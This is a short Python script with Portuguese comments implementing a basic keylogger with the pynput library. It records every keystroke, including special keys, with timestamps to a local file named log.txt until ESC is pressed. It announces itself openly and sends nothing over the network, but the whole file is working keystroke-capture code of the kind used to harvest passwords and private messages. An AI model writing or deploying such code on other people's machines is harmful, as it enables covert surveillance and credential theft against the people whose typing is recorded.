from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

# Configuração do arquivo de log
log_file = "log.txt"

# Configurar o logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def on_press(key):
    """Função chamada quando uma tecla é pressionada"""
    try:
        # Teclas normais (letras, números, símbolos)
        logging.info(f'Tecla pressionada: {key.char}')
    except AttributeError:
        # Teclas especiais (Enter, Shift, Ctrl, etc)
        logging.info(f'Tecla especial pressionada: {key}')

def on_release(key):
    """Função chamada quando uma tecla é solta"""
    # Encerra o keylogger quando ESC é pressionado
    if key == Key.esc:
        print("\n Tecla ESC pressionada. Encerrando keylogger...")
        return False

def main():
    """Função principal do keylogger"""
    print(" Keylogger Básico Iniciado")
    print(" Capturando teclas digitadas...")
    print(" Pressione ESC para encerrar")
    print(f" Log salvo em: {log_file}\n")
    
    # Inicia o listener do teclado
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print("\n Keylogger encerrado")
    print(f" Verifique o arquivo {log_file} para ver as teclas capturadas")

if __name__ == "__main__":
    main()
